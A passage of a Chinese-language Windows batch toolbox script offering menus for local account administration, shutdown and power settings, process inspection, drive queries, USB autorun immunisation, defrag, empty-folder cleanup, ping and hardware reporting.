echo;当前已登录的用户:!username!
!hx!
set tishengyonghu=
set /p "tishengyonghu=请输入要提升的用户名: "
cls
net localgroup administrators !tishengyonghu! /add
!hx!
set /p =按任意键返回<nul&pause>nul
endlocal
goto 21
:21.5
title 强制修改用户密码!system!
cls
!hx!
net user
!hx!
echo;当前已登录的用户:!username!
!hx!
set xiougaimima=
set xinmima=
set /p "xiougaimima=请输入要修改的用户名: "
set /p "xinmima=请输入新密码: "
cls
net user !xiougaimima! !xinmima!
!hx!
set /p =按任意键返回<nul&pause>nul
endlocal
goto 21
:21.6
title 查看用户信息!system!
cls
net user
!hx!
echo;当前已登录的用户:!username!
!hx!
set chakanyonghuxinxi=
set /p "chakanyonghuxinxi=请输入要查看的用户名: "
cls
net user !chakanyonghuxinxi!
!hx!
set /p =按任意键返回<nul&pause>nul
endlocal
goto 21
:21.7
title 激活账户!system!
cls
net user
!hx!
echo;当前已登录的用户:!username!
!hx!
set jhzh=
set /p "jhzh=请输入要操作的用户名: "
cls
net user !jhzh! /active:yes
!hx!
set /p =按任意键返回<nul&pause>nul
endlocal
goto 21
:21.8
title 停用账户!system!
cls
net user
!hx!
echo;当前已登录的用户:!username!
!hx!
set tyzh=
set /p "tyzh=请输入要操作的用户名: "
cls
net user !tyzh! /active:no
!hx!
set /p =按任意键返回<nul&pause>nul
endlocal
goto 21
:22
cls
start gpedit.msc
goto memuv2
:guanji
setlocal
title 关机选项!system!
set "cho=1234567890"
color 0a
cls
!hx!
echo;[1]关机
echo;[2]重启
echo;[3]注销
echo;[4]放弃系统关机
echo;[5]开启休眠功能
echo;[6]关闭休眠功能
echo;[7]显示系统上可用的睡眠状态
echo;[8]锁屏
echo;[9]循环显示唤醒计时器与电源请求
echo;[0]返回菜单
!hx!
!sel!
if "!shuru!" equ "1" (goto guanji.1)
if "!shuru!" equ "2" (goto guanji.2)
if "!shuru!" equ "3" (goto guanji.3)
if "!shuru!" equ "4" (goto guanji.4)
if "!shuru!" equ "5" (goto guanji.6)
if "!shuru!" equ "6" (goto guanji.7)
if "!shuru!" equ "7" (goto guanji.8)
rem if "!shuru!" equ "8" (tsdiscon)
if "!shuru!" equ "8" (rundll32.exe user32.dll LockWorkStation)
if "!shuru!" equ "9" (goto guanji-9)
if "!shuru!" equ "10" (endlocal&goto memuv2)
if "!shuru!" equ "0" (endlocal&goto memuv2)
set /p =请输入正确的选项！<nul
call :out 2
endlocal
goto guanji
:guanji.1
title 关机!system!
cls
set guanjidaojishi=
set /p "guanjidaojishi=请设置关机倒计时，有效范围(0-315360000)秒(e=返回): "
if /i "!guanjidaojishi!" equ "e" (endlocal&goto guanji)
call :checkvar guanjidaojishi num jg
if "!jg!" equ "0" (
	set /p =不是有效数字！<nul
	call :out 2
	goto guanji.1
)
shutdown /s /f /t !guanjidaojishi!
endlocal
goto guanji
:guanji.2
title 重启!system!
cls
set chongqidaojishi=
set /p "chongqidaojishi=请设置重启倒计时，有效范围(0-315360000)秒(e=返回): "
if "!chongqidaojishi!" equ "e" (endlocal&goto guanji)
call :checkvar chongqidaojishi num jg
if "!jg!" equ "0" (
	set /p =不是有效数字！<nul
	call :out 2
	goto guanji.2
)
shutdown /r /f /t !chongqidaojishi!
endlocal
goto guanji
:guanji.3
title 注销!system!
cls
set zhuxiao=
set /p "zhuxiao=是否立即注销(y/n): "
if /i "!zhuxiao!" equ "y" (logoff&exit 0)
if /i "!zhuxiao!" equ "n" (endlocal&goto guanji)
set /p =请输入正确的选项！<nul
call :out 2
goto guanji.3
:guanji.4
title 放弃系统关机!system!
cls
shutdown /a
call :out 2
endlocal
goto guanji
:guanji.6
title 开启休眠!system!
cls
set size=
set /p "size=设置休眠文件占用总内存比例(40~100)(默认100)(e=返回): "
if /i "!size!" equ "e" (endlocal&goto guanji)
call :checkvar size num jg
if "!jg!" equ "0" (
	set /p =不是有效数字！<nul
	call :out 2
	goto guanji.6
)
if !size! geq 40 (
	if !size! leq 100 (
		powercfg /h /size !size!
		set /p =已开启休眠功能<nul
		call :out 2
		endlocal
		goto guanji
	)
)
set /p =不是有效数字！<nul
call :out 2
goto guanji.6
:guanji.7
title 关闭休眠!system!
cls
powercfg -h off
set /p =已关闭休眠功能<nul
call :out 2
endlocal
goto guanji
:guanji.8
title 显示系统上可用的睡眠状态!system!
cls
powercfg -a
!hx!
set /p =按任意键返回<nul&pause>nul
endlocal
goto guanji
:guanji-9
title 循环显示唤醒计时器与电源请求!system!
cls
powercfg /requests
powercfg /waketimers
!hx!
echo;按e返回菜单
choice /c 1e /t 1 /d 1 >nul
if "!errorlevel!" equ "2" (endlocal&goto guanji)
goto guanji-9
:23
setlocal
title DOS任务管理器!system!
set cho=1234560
cls
!hx!
echo;[1]显示所有进程
echo;[2]显示每个进程的服务
echo;[3]显示进程路径
echo;[4]显示进程详细信息
echo;[5]显示进程的TCP/UDP连接
echo;[6]循环显示CPU占用率与网络速度
echo;[0]返回菜单
!hx!
!sel!
if "!shuru!" equ "1" (goto 23.1)
if "!shuru!" equ "2" (goto 23.2)
if "!shuru!" equ "3" (goto 23.6)
if "!shuru!" equ "4" (goto 23.10)
if "!shuru!" equ "5" (goto 23.3)
if "!shuru!" equ "6" (goto 23.4)
if "!shuru!" equ "7" (endlocal&goto memuv2)
if "!shuru!" equ "0" (endlocal&goto memuv2)
set /p =请输入正确的选项！<nul
endlocal
goto 23
:23.1
cls
tasklist
!hx!
set jcjs=
set /p "jcjs=输入要结束的进程PID或名称(e=返回)(f=刷新): "
if not defined jcjs (goto 23.1)
if /i "!jcjs!" equ "f" (goto 23.1)
if /i "!jcjs!" equ "e" (endlocal&goto 23)
taskkill /f /im !jcjs!
call :out 2
goto 23.1
:23.2
cls
tasklist /svc
!hx!
set jcjs=
set /p "jcjs=输入要结束的进程PID或名称(e=返回)(f=刷新): "
if not defined jcjs (goto 23.2)
if /i "!jcjs!" equ "f" (goto 23.2)
if /i "!jcjs!" equ "e" (endlocal&goto 23)
taskkill /f /im !jcjs!
call :out 2
goto 23.2
:23.6
title 显示进程路径!system!
cls
tasklist
!hx!
set jclj=
set /p "jclj=输入要显示的进程PID(e=返回)(f=刷新): "
if not defined jclj (goto 23.6)
if /i "!jclj!" equ "f" (goto 23.6)
if /i "!jclj!" equ "e" (endlocal&goto 23)
tasklist /fi "pid eq !jclj!"|findstr /i "!jclj!"||(
	set /p =没有此进程<nul
	call :out 2
	goto 23.6
)
cls
for /f "tokens=2 delims==" %%a in ('"wmic process where processid=!jclj! get executablepath /value"') do (
	set "jclj1=%%a"
	set "jclj1=!jclj1:~0,-1!"
)
echo;文件路径: !jclj1!
!hx!
echo;(e=返回)(d=打开文件位置)
set cho=ed
!sel!
if "!shuru!" equ "1" (endlocal&goto 23)
if "!shuru!" equ "2" (goto 23.8)
if /i "!shuru!" equ "e" (endlocal&goto 23)
if /i "!shuru!" equ "d" (goto 23.8)
set /p =请输入正确的选项！<nul
call :out 2
goto 23.6
:23.8
explorer /select,"!jclj1!"
endlocal
goto 23
:23.10
title 显示进程详细信息!system!
cls
!hx!
tasklist
!hx!
set jclj=
set /p "jclj=输入要显示的进程PID(e=返回)(f=刷新): "
if not defined jclj (goto 23.10)
if /i "!jclj!" equ "f" (goto 23.10)
if /i "!jclj!" equ "e" (endlocal&goto 23)
tasklist /fi "pid eq !jclj!"|findstr /i "!jclj!"||(
	set /p =没有此进程<nul
	call :out 2
	goto 23.10
)
cls
!hx!
for /f "delims=" %%a in ('"wmic process where processid=!jclj! get * /value"') do (
	set "var=%%a"
	set "var=!var:~0,-1!"
	set "!var!">nul
)
if defined name (echo;名称:		!name!)
if defined parentprocessid (echo;父系PID:	!parentprocessid!)
if defined threadCount (echo;线程数:		!threadCount!)
if defined handlecount (echo;句柄数:		!handlecount!)
if defined workingsetsize (
	call :xdwjs !workingsetsize! zj workingsetsize
	echo;工作集大小:	!workingsetsize!
)
if defined pagefileusage (
	call :xdwjs !pagefileusage! kb pagefileusage
	echo;页面文件使用:	!pagefileusage!
)
if defined creationdate (echo;进程启动日期:	!creationdate:~0,4!年!creationdate:~4,2!月!creationdate:~6,2!日 !creationdate:~8,2!:!creationdate:~10,2!:!creationdate:~12,2!)
if defined priority (echo;优先级:		!priority!)
if defined sessionid (echo;会话ID:		!sessionid!)
if defined readoperationcount (echo;读取操作数:	!readoperationcount!)
if defined readtransfercount (
	call :xdwjs !readtransfercount! zj readtransfercount
	echo;读取传输量:	!readtransfercount!
)
if defined writeoperationcount (echo;写入操作数:	!writeoperationcount!)
if defined writetransfercount (
	call :xdwjs !writetransfercount! zj writetransfercount
	echo;写入传输量:	!writetransfercount!
)
if defined executablepath (echo;路径:		!executablepath!)
if defined commandline (
	echo;命令行:		!commandline!
) else (
	echo;命令行:
	wmic process where processid=!jclj! get commandline /format:value
)
tasklist /fi "pid eq !jclj!" /m
ver
!hx!
set /p =按任意键返回<nul&pause>nul
endlocal
goto 23
:23.3
title 显示TCP/UDP连接!system!
cls
netstat -aon
!hx!
set 字符串=
set /p "字符串=输入要查找的字符串(e=返回)(f=刷新): "
if not defined 字符串 (goto 23.3)
if "!字符串!" equ "f" (goto 23.3)
if /i "!字符串!" equ "e" (endlocal&goto 23)
cls
netstat -aon|findstr /i /c:"!字符串!"
!hx!
set /p =按任意键返回<nul&pause>nul
endlocal
goto 23
:23.4
color 0f
set ysbak=97;40m
title 循环显示CPU占用率与网络速度!system!
cls
echo;正在获取网络信息...
for /f "tokens=2 delims==" %%a in ('Wmic path Win32_PerfFormattedData_Tcpip_NetworkInterface get name /value') do (
    set "netcard=%%a"
	set "netcard=!netcard:~0,-1!"
)
for /f "tokens=2 delims==" %%a in ('wmic cpu get numberOflogicalprocessors /value') do (
    set "corenum=%%a"
	set "corenum=!corenum:~0,-1!"
    set /a "tghs=corenum*2+4+2"
)
for /f "tokens=2 delims==" %%a in ('wmic cpu get name /value') do (
    set "cpu=%%a"
	set "cpu=!cpu:~0,-1!"
)
cls
:23.4.1
(
set xh=
for /f "tokens=2 delims==" %%a in ('Wmic path Win32_PerfFormattedData_Tcpip_NetworkInterface get BytesReceivedPersec^,BytesSentPersec /value') do (
    set /a "xh+=1"
    if "!xh!" equ "1" (
        set "downspeed=%%a"
		set "downspeed=!downspeed:~0,-1!"
	)
    if "!xh!" equ "2" (
        set "upspeed=%%a"
		set "upspeed=!upspeed:~0,-1!"
        for /f "skip=%tghs% tokens=2 delims==" %%a in ('Wmic Path Win32_PerfFormattedData_PerfOS_Processor Get PercentIdleTime /value') do (
            set "bfb=%%a"
			set "bfb=!bfb:~0,-1!"
			set /a "lyl=100-bfb"
		)
	)
)
call :xdwjs !upspeed! b upspeed
call :xdwjs !downspeed! b downspeed
echo;!netcard!
echo;
(echo;上传速度:  !upspeed!/s 下载速度:   !downspeed!/s   	)
echo;
echo;!cpu!
echo;
set /p =CPU总体利用率:  <nul
if !lyl! leq 25 (
    call :rgb 12.12.12 0.255.0 !lyl!
) else (
    if !lyl! leq 50 (
        call :rgb 12.12.12 255.255.0 !lyl!
	) else (
        if !lyl! leq 75 (
            call :rgb 12.12.12 255.127.0 !lyl!
		) else (
            call :rgb 12.12.12 255.0.0 !lyl!
		)
	)
)
set /p =%%  <nul
echo;
!hx!
echo;按e返回菜单
set /p =!cswz!s!cswz!0;0H<nul
choice /c 1e /t 1 /d 1 >nul
if "!errorlevel!" equ "2" (
	endlocal
	goto 23
)
goto 23.4.1
)
:24
setlocal
title 文件系统信息查询!system!
set "cho=1234560"
cls
!hx!
echo;[1]列出所有驱动器
echo;[2]查询一个驱动器的类型
echo;[3]查询卷信息
echo;[4]查询NTFS卷信息
echo;[5]查询REFS卷信息
echo;[6]查询扇区信息
echo;[0]返回菜单
!hx!
!sel!
if "!shuru!" equ "1" (goto 24.1)
if "!shuru!" equ "2" (goto 24.2)
if "!shuru!" equ "3" (goto 24.3)
if "!shuru!" equ "4" (goto 24.4)
if "!shuru!" equ "5" (goto 24.5)
if "!shuru!" equ "6" (goto 24.6)
if "!shuru!" equ "7" (endlocal&goto memuv2)
if "!shuru!" equ "0" (endlocal&goto memuv2)
set /p=请输入正确的选项！<nul
call :out 2
endlocal
goto 24
:24.1
titel 列出所有驱动器!system!
cls
fsutil fsinfo drives
!hx!
set /p =按任意键返回<nul&pause>nul
endlocal
goto 24
:24.2
title 查询一个驱动器的类型!system!
cls
!hx!
fsutil fsinfo drives
!hx!
set qdqlx=
set /p "qdqlx=请输入要查询的驱动器: "
if not defined qdqlx (goto 24.2)
cls
fsutil fsinfo drivetype !qdqlx!:
!hx!
set /p =按任意键返回<nul&pause>nul
endlocal
goto 24
:24.3
title 查询卷信息!system!
cls
!hx!
fsutil fsinfo drives
!hx!
set qdqlx=
set /p "qdqlx=请输入要查询的驱动器: "
if not defined qdqlx (goto 24.3)
cls
fsutil fsinfo volumeinfo !qdqlx!:
!hx!
set /p =按任意键返回<nul&pause>nul
endlocal
goto 24
:24.4
title 查询NTFS卷信息!system!
cls
!hx!
fsutil fsinfo drives
!hx!
set qdqlx=
set /p "qdqlx=请输入要查询的驱动器: "
if not defined qdqlx (goto 24.4)
cls
fsutil fsinfo ntfsinfo !qdqlx!:
!hx!
set /p =按任意键返回<nul&pause>nul
endlocal
goto 24
:24.5
title 查询REFS卷信息!system!
cls
!hx!
fsutil fsinfo drives
!hx!
set qdqlx=
set /p "qdqlx=请输入要查询的驱动器: "
if not defined qdqlx (goto 24.5)
cls
fsutil fsinfo refsinfo !qdqlx!:
!hx!
set /p =按任意键返回<nul&pause>nul
endlocal
goto 24
:24.6
title 查询扇区信息!system!
cls
!hx!
fsutil fsinfo drives
!hx!
set qdqlx=
set /p "qdqlx=请输入要查询的驱动器: "
if not defined qdqlx (goto 24.6)
cls
fsutil fsinfo sectorinfo !qdqlx!:
!hx!
set /p =按任意键返回<nul&pause>nul
endlocal
goto 24
:25
setlocal
title 创建指定大小的文件!system!
cls
set cjlj=
set /p "cjlj=请输入文件路径(e=返回): "
if not defined cjlj (endlocal&goto 25)
if /i "!cjlj!" equ "e" (endlocal&goto memuv2)
set cjdx=
set /p "cjdx=请输入文件大小(单位:字节)(e=返回): "
if not defined cjdx (endlocal&goto 25)
if /i "!cjdx!" equ "e" (endlocal&goto memuv2)
call :checkvar cjdx num jg
if "!jg!" equ "0" (endlocal&goto 25)
fsutil file createnew !cjlj! !cjdx!
!hx!
set /p =按任意键返回<nul&pause>nul
endlocal
goto memuv2
:26
setlocal
title 免疫U盘病毒!system!
set "cho=120"
cls
echo;此功能针对U盘进行免疫，避免autorun类型的病毒自动启动
!hx!
echo;[1]启动U盘免疫
echo;[2]取消U盘免疫
echo;[0]返回菜单
!hx!
rem choice /c 120 /n /m 请输入你的选择:
!sel!
if "!shuru!" equ "1" goto 26(1)
if "!shuru!" equ "2" goto 26(2)
if "!shuru!" equ "3" endlocal&goto memuv2
if "!shuru!" equ "0" endlocal&goto memuv2
set /p =请输入正确的选项！<nul
call :out 2
endlocal
goto 26
:26(1)
title 启动U盘免疫!system!
cls
echo;正在搜索可移动磁盘...
for /f "delims=" %%a in ('fsutil fsinfo drives') do (
	set "sypf=%%a"
	set "sypf=!sypf:~5!"
)
for %%l in (!sypf!) do (
	fsutil fsinfo drivetype %%l|find /i "可移动驱动器"&&goto 26-3
)
cls
echo;没有找到可移动磁盘
!hx!
set /p =按任意键返回<nul&pause>nul
endlocal
goto 26
:26-3
cls
for /f "delims=" %%a in ('fsutil fsinfo drives') do (
	set "sypf=%%a"
	set "sypf=!sypf:~5!"
)
for %%l in (!sypf!) do (
	fsutil fsinfo drivetype %%l|find /i "可移动驱动器"&&(
		takeown/f %%lautorun.inf
		echo;y|cacls %%lautorun.inf /t /c /p everyone:f
		attrib -s -h -r %%lautorun.inf
		del /f /q %%lautorun.inf
		rd /s /q %%lautorun.inf
		md %%lautorun.inf
		md "%%lautorun.inf\免疫文件夹！请勿删除"
		md "%%lautorun.inf\免疫文件夹！请勿删除 / "
		echo;y|cacls %%lautorun.inf /t /c /p everyone:r
	)
) 2>nul
echo;
!hx!
echo;U盘免疫完成
set /p =按任意键返回<nul&pause>nul
endlocal
goto 26
:26(2)
title 取消U盘免疫!system!
cls
echo;正在搜索可移动磁盘...
for /f "delims=" %%a in ('fsutil fsinfo drives') do (
	set "sypf=%%a"
	set "sypf=!sypf:~5!"
)
for %%m in (!sypf!) do (
	fsutil fsinfo drivetype %%m|find /i "可移动驱动器"&&goto 26-4
)
cls
echo;没有找到可移动磁盘
!hx!
set /p =按任意键返回<nul&pause>nul
endlocal
goto 26
:26-4
cls
for /f "delims=" %%a in ('fsutil fsinfo drives') do (
	set "sypf=%%a"
	set "sypf=!sypf:~5!"
)
for %%m in (!sypf!) do (
	fsutil fsinfo drivetype %%m|find /i "可移动驱动器"&&(
		takeown/f %%mautorun.inf
		echo;y|cacls %%mautorun.inf /t /c /p everyone:f
		attrib -s -h -r %%mautorun.inf
		del /f /q %%mautorun.inf
		rd /s /q %%mautorun.inf
	)
) 2>nul
!hx!
echo;取消U盘免疫完成
set /p =按任意键返回<nul&pause>nul
endlocal
goto 26
:27
setlocal
title 磁盘碎片整理!system!
cls
!hx!
echo;[1]整理所有磁盘
echo;[0]返回菜单
!hx!
fsutil fsinfo drives
!hx!
set fenxi=
set /p "fenxi=请输入需要分析的盘符:"
if "!fenxi!" equ "1" (goto 27.1)
if "!fenxi!" equ "0" (endlocal&goto memuv2)
cls
defrag /a !fenxi!:
!hx!
:27.3
set zhengli=
set /p "zhengli=是否开始磁盘碎片清理(y/n):"
if /i "!zhengli!" equ "y" (goto 27.2)
if /i "!zhengli!" equ "n" (endlocal&goto 27)
echo;请输入正确的选项！
call :out 2
goto 27.3
:27.1
cls
for /f "delims=" %%a in ('fsutil fsinfo drives') do (
	set "sypf=%%a"
	set "sypf=!sypf:~5!"
)
if /i "!system:~11,2!" equ "XP" (
	for %%n in (!sypf!) do (defrag /v /x %%n)
)
for %%n in (!sypf!) do (defrag /u /v /x %%n)
!hx!
set /p =按任意键返回<nul&pause>nul
endlocal
goto 27
:27.2
cls
defrag /u /v /x !fenxi!:||defrag /v /x !fenxi!:
!hx!
set /p =按任意键返回<nul&pause>nul
endlocal
goto 27
:28
setlocal
title 一键删除空文件夹!system!
cls
echo;注意:如果对系统盘进行操作可能会被杀毒软件拦截
!hx!
fsutil fsinfo drives
!hx!
set caozuo=
set /p "caozuo=请输入需要操作的盘符或路径: "
if not defined caozuo (
	endlocal
	goto 28
)
call :strlen caozuo jg
if "!jg!" equ "1" (
	set "caozuo=!caozuo!:\"
) else (
	for /f "delims=" %%a in ("!caozuo!") do (
		set "caozuo=%%~fa"
		dir /ad "!caozuo!">nul 2>nul||(
			echo;路径 "!caozuo!" 不是一个文件夹
			timeout /t 2 /nobreak>nul
			endlocal
			goto 28
		)
	)
)
cls
echo;检测Everything的安装路径与运行状态...
for /f "skip=2 tokens=3 delims= " %%a in ('reg query "HKEY_LOCAL_MACHINE\SOFTWARE\voidtools\Everything" /v InstallLocation') do (
	set "EverythingInstallPath=%%a"
)
if exist "!EverythingInstallPath!\Everything.exe" (
	tasklist /fi "status eq running" /fi "username eq "%username%"" /fi "imagename eq everything.exe"|find /i "Everything.exe"&&(
		if exist "!EverythingInstallPath!\es.exe" (
			cls
			echo;正在搜索空文件夹...     文件越多搜索时间越长
			goto loop1
		)
	)
	cls
	echo;正在搜索空文件夹...     文件越多搜索时间越长
	goto loop2
)
:loop1
set empty=0
for /f "delims=" %%o in ('""!EverythingInstallPath!\es.exe" "!caozuo!" empty: ^!attrib:l"') do (
	rd /q "%%o"&&(
		set empty=1
		echo;已删除空文件夹 "%%o"
	)
)
timeout /t 2 /nobreak>nul
if "!empty!" equ "1" (goto loop1)
goto 28.1
:loop2
for /f "delims=" %%o in ('"dir /a /s /b /ad-l "!caozuo!"|sort /r"') do (
	rd /q "%%o"2>nul&&(
		echo;已删除空文件夹 "%%o"
	)
)
:28.1
!hx!
echo;空文件夹删除完成
set /p =按任意键返回菜单<nul&pause>nul
endlocal
goto memuv2
:29
setlocal
title ping测试网络延迟!system!
cls
if exist "%systemroot%\system32\curl.exe" (
	ping /n 1 www.baidu.com>nul
	if "!errorlevel!" equ "0" (
		rem set /p =本机IPV4地址: <nul
		rem curl https://4.ipw.cn
		rem curl https://ipv4.ip.sb
		curl https://myip.ipip.net
		set /p =<nul
		echo;
	)
	ping /n 1 240c::6666>nul
	if "!errorlevel!" equ "0" (
		set /p =本机IPV6地址: <nul
		curl https://6.ipw.cn
		rem curl https://ipv6.ip.sb
		echo;
	)
)
echo;
set ping=
set pingcishu=
set /p "ping=请输入目标IP或者网址: "
set /p "pingcishu=请输入ping次数: "
echo;
echo;正在测试!ping!的网络延迟...
ping /n !pingcishu! !ping! /a
!hx!
set /p =按任意键返回菜单<nul&pause>nul
endlocal
goto memuv2
:30
setlocal
title 硬件检测!system!
cls
for /f "tokens=2 delims==" %%a in ('Wmic OS Get LastBootUpTime /value') do (
    set "systemstarttime=%%a"
    echo;系统启动时间:	!systemstarttime:~0,4!年!systemstarttime:~4,2!月!systemstarttime:~6,2!日 !systemstarttime:~8,2!:!systemstarttime:~10,2!:!systemstarttime:~12,2!
    echo;
)
for /f "tokens=2 delims==" %%a in ('Wmic OS Get InstallDate /value') do (
    set "systeminstalltime=%%a"
    echo;系统安装日期:	!systeminstalltime:~0,4!年!systeminstalltime:~4,2!月!systeminstalltime:~6,2!日 !systeminstalltime:~8,2!:!systeminstalltime:~10,2!:!systeminstalltime:~12,2!
    echo;
)
set cs=
for /f "tokens=2 delims==" %%a in ('wmic cpu get name /value') do (
	set /a "cs+=1"
	set "var=%%a"
	if "!var:~0,-1!" neq "" (
		if "!cs!" equ "1" (
			set /p =CPU:<nul
			echo;		!var:~0,-1!
		) else (
			echo;			!var:~0,-1!
		)
	)
)
echo;
for /f "tokens=2 delims==" %%a in ('wmic cpu get numberofcores /value') do (
	for /f "tokens=2 delims==" %%b in ('wmic cpu get numberOflogicalprocessors /value') do (
		set "var1=%%a"
		set "var2=%%b"
		echo;		!var1:~0,-1!核心 !var2:~0,-1!线程
		echo;
	)
)
set cs=
set /p =CPUID:<nul
for /f "tokens=2 delims==" %%a in ('"wmic cpu get processorid /value 2>nul"') do (
	set /a "cs+=1"
	set "var=%%a"
	if "!var:~0,-1!" neq "" (
		if "!cs!" equ "1" (
			echo;		!var:~0,-1!
		) else (
			echo;			!var:~0,-1!
		)
	)
)
echo;
set ch=
for /f "tokens=2 delims==" %%a in ('wmic path win32_cachememory get maxcachesize /value') do (
    set /a "ch+=1"
	set dw=0
    if "!ch!" equ "1" (
		call :xdwjs %%a kb dw
		echo;一级缓存:	!dw!
		echo;
	) else (
        if "!ch!" equ "2" (
            call :xdwjs %%a kb dw
			echo;二级缓存:	!dw!
			echo;
		) else (
            if "!ch!" equ "3" (
	    		call :xdwjs %%a kb dw
	    		echo;三级缓存:	!dw!
	    		echo;
			) else (
                if "!ch!" equ "4" (
                    call :xdwjs %%a kb dw
	    			echo;四级缓存:	!dw!
	    			echo;
				)
			)
		)
	)
)
set cs=
for /f "tokens=2 delims==" %%a in ('wmic cpu get currentclockspeed /value') do (
	set /a "cs+=1"
	set "var=%%a"
	if "!var:~0,-1!" neq "" (
		if "!cs!" equ "1" (
			set /p =CPU主频:<nul
			echo;	!var:~0,-1! MHz
		) else (
			echo;		!var:~0,-1! MHz
		)
	)
)
echo;
for /f "tokens=2 delims==" %%a in ('wmic cpu get datawidth /value') do (
	set "var=%%a"
	if "!var:~0,-1!" neq "" (
		echo;数据位宽: 	!var:~0,-1! bit
		echo;
	)
)
for /f "tokens=2 delims==" %%a in ('wmic cpu get extclock /value') do (
	set "var=%%a"
	if "!var:~0,-1!" neq "" (
		echo;外频: 		!var:~0,-1! MHz
	)
)
!hx!
for /f "tokens=2 delims==" %%a in ('wmic baseboard get manufacturer /value') do (
	set "var=%%a"
	echo;主板制造商:	!var:~0,-1!
	echo;
)
for /f "tokens=2 delims==" %%a in ('wmic baseboard get product /value') do (
	set "var=%%a"
	echo;主板型号:	!var:~0,-1!
	echo;
)
for /f "tokens=2 delims==" %%a in ('Wmic Csproduct Get Uuid /value') do (
	set "var=%%a"
	echo;主板UUID:	!var:~0,-1!
	echo;
)
for /f "tokens=2 delims==" %%a in ('wmic bios get manufacturer /value') do (
	set "var=%%a"
	echo;BIOS制造商:	!var:~0,-1!
	echo;
)

for /f "tokens=2 delims==" %%a in ('wmic bios get smbiosbiosversion /value') do (
	set "var=%%a"
	echo;BIOS版本:	!var:~0,-1!
	echo;
)
for /f "tokens=2 delims==" %%a in ('wmic bios get releasedate /value') do (
	set "bioszzrq=%%a"
	echo;BIOS制造日期: 	!bioszzrq:~0,4!年!bioszzrq:~4,2!月!bioszzrq:~6,2!日
)
!hx!
set cs=
for /f "tokens=2 delims==" %%a in ('wmic desktopmonitor get name /value') do (
	set /a "cs+=1"
	set "var=%%a"
	if "!var:~0,-1!" neq "" (
		if "!cs!" equ "1" (
			set /p =显示器型号:<nul
			echo;	!var:~0,-1!
		) else (
			echo;		!var:~0,-1!
		)
	)
)
echo;
set cs=
for /f "tokens=2 delims==" %%a in ('wmic desktopmonitor get monitormanufacturer /value') do (
	set /a "cs+=1"
	set "var=%%a"
	if "!var:~0,-1!" neq "" (
		if "!cs!" equ "1" (
			set /p =显示器制造商:<nul
			echo;	!var:~0,-1!
		) else (
			echo;		!var:~0,-1!
		)
	)
)
echo;
set cs=
for /f "tokens=2 delims==" %%a in ('wmic path win32_videocontroller get currenthorizontalresolution /value') do (
	for /f "tokens=2 delims==" %%b in ('wmic path win32_videocontroller get currentverticalresolution /value') do (
		set /a "cs+=1"
		set "var1=%%a"
		set "var2=%%b"
		if "!cs!" equ "1" (
			set /p =分辨率:<nul
			echo;		!var1:~0,-1! x !var2:~0,-1!
		) else (
			echo;			!var1:~0,-1! x !var2:~0,-1!
		)
	)
)
!hx!
set cs=
for /f "tokens=2 delims==" %%a in ('wmic path win32_videocontroller get name /value') do (
	set /a "cs+=1"
	set "var=%%a"
	if "!var:~0,-1!" neq "" (
		if "!cs!" equ "1" (
			set /p =显卡:<nul
			echo;		!var:~0,-1!
		) else (
			echo;			!var:~0,-1!
		)
	)
)
echo;
set cs=
for /f "tokens=2 delims==" %%a in ('wmic path win32_videocontroller get adapterram /value') do (
	set /a "cs+=1"
	set dw=0
	if "!cs!" equ "1" (
		call :xdwjs %%a b dw
		set /p =显存容量:<nul
		echo;	!dw!
	) else (
		call :xdwjs %%a b dw
		echo;		!dw!
	)
)
echo;
for /f "tokens=2 delims==" %%a in ('wmic path win32_videocontroller get videomodedescription /value') do (
	set "var=%%a"
	echo;当前显示模式: 	!var:~0,-1!
	echo;
)
for /f "tokens=2 delims==" %%a in ('wmic path win32_videocontroller get currentrefreshrate /value') do (
	set "var=%%a"
	echo;当前刷新率: 	!var:~0,-1! Hz
	echo;
)
for /f "tokens=2 delims==" %%a in ('wmic path win32_videocontroller get driverdate /value') do (
	set "qdrq=%%a"
	echo;驱动日期: 	!qdrq:~0,4!年!qdrq:~4,2!月!qdrq:~6,2!日
	echo;
)
for /f "tokens=2 delims==" %%a in ('wmic path win32_videocontroller get driverversion /value') do (
	set "var=%%a"
	echo;驱动版本: 	!var:~0,-1!
)
!hx!
set cs=
for /f "tokens=2 delims==" %%a in ('wmic diskdrive get model /value') do (
	set /a "cs+=1"
	set "var=%%a"
	if "!var:~0,-1!" neq "" (
		if "!cs!" equ "1" (
			set /p =硬盘型号:<nul
			echo;	!var:~0,-1!
		) else (
			echo;		!var:~0,-1!
		)
	)
)
echo;
set cs=0
for /f "delims=" %%a in ('"wmic diskdrive get interfacetype^,size^,totalsectors^,partitions^,firmwarerevision /value 2>nul"') do (
	set "var=%%a"
	set "var=!var:~0,-1!"
	if defined var (
		if "!cs!" equ "0" (echo;固件版本	接口类型	硬盘容量	总扇区数	分区数)
		set /a "cs+=1"
		set "!var!">nul
		if "!cs!" equ "5" (
			call :xdwjs !size! b size
			call :strlen firmwarerevision cd
			if !cd! lss 8 (
				set "dsp=!firmwarerevision!		"
			) else (
				set "dsp=!firmwarerevision!	"
			)
			call :strlen interfacetype cd
			if !cd! lss 8 (
				set "dsp=!dsp!!interfacetype!		"
			) else (
				set "dsp=!dsp!!interfacetype!	"
			)
			call :strlen size cd
			if !cd! lss 8 (
				set "dsp=!dsp!!size!		"
			) else (
				set "dsp=!dsp!!size!	"
			)
			call :strlen totalsectors cd
			if !cd! lss 8 (
				set "dsp=!dsp!!totalsectors!		"
			) else (
				set "dsp=!dsp!!totalsectors!	"
			)
			call :strlen partitions cd
			if !cd! lss 8 (
				set "dsp=!dsp!!partitions!"
			) else (
				set "dsp=!dsp!!partitions!"
			)
			echo;!dsp!
			set cs=
		)
	)
)
fsutil fsinfo drives
echo;
for /f "delims=" %%a in ('wmic logicaldisk get name^,volumename^,description^,filesystem^,size^,freespace') do (
	set "var=%%a"
	if "!var:~0,-1!" neq "" (
		echo;!var:~0,-1!
	)
)
!hx!
set cs=
set /p =打印机制造商:<nul
for /f "tokens=2 delims==" %%a in ('Wmic Printer where "Default='TRUE'" get caption /value') do (
	set /a "cs+=1"
	set "var=%%a"
	if "!var:~0,-1!" neq "" (
		if "!cs!" equ "1" (
			echo;	!var:~0,-1!
		) else (
			echo;		!var:~0,-1!
		)
	)
)
echo;
set cs=
set /p =打印机型号:<nul
for /f "tokens=2 delims==" %%a in ('Wmic Printer where "Default='TRUE'" get drivername /value') do (
	set /a "cs+=1"
	set "var=%%a"
	if "!var:~0,-1!" neq "" (
		if "!cs!" equ "1" (
			echo;	!var:~0,-1!
		) else (
			echo;		!var:~0,-1!
		)
	)
)
echo;
set cs=
